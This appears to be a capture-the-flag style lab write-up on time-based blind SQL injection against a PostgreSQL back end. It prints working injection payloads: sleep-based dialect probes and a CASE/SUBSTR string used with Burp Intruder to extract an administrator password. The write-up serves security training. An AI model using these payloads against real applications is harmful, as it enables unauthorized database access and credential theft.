# Lab: Blind SQL injection with time delays and information retrieval

**Date:** February 5, 2026
**Vulnerability Type:** Time-Based Blind SQL Injection
**Difficulty:** Practitioner

## 1. Objective
The goal was to confirm a time-based vulnerability and exfiltrate the `administrator` password from a PostgreSQL database. Unlike standard blind SQLi, this database provides no visual feedback or error messages; exfiltration must be measured in the temporal dimension.

## 2. Discovery & Dialect Fingerprinting
To identify the backend database, I performed "Dialect Probing" by testing sleep functions for different SQL environments:
- **Microsoft SQL Server Test:** `'; IF (1=1) WAITFOR DELAY '0:0:10'--`. Result: Instant response (Failed).
- **PostgreSQL Test:** `' || pg_sleep(10)--`. Result: **10,000ms+ delay (Confirmed PostgreSQL)**.

## 3. Exploitation (Temporal Brute-force)
Once the dialect was confirmed, I used a `CASE` statement to automate character extraction via Burp Intruder.

### Extraction Payload:
`' || (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,§1§,1)='§a§') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--`

### Execution Strategy:
- **Attack Type:** Cluster Bomb.
- **Resource Pool:** Limited to **1 concurrent request** to ensure network jitter did not interfere with the 3000ms/6000ms "True" signals.
- **Verification:** Correct character guesses were identified by sorting the **"Response received"** column in Intruder.

## 4. Final Result
- **Data Recovered:** 20-character password.
- **Verification:** Successfully logged into the `administrator` account. 
- **Trigger:** The lab officially marked as solved upon successful execution of the confirmed `pg_sleep(10)` signature.
- **Status:** **LAB SOLVED**
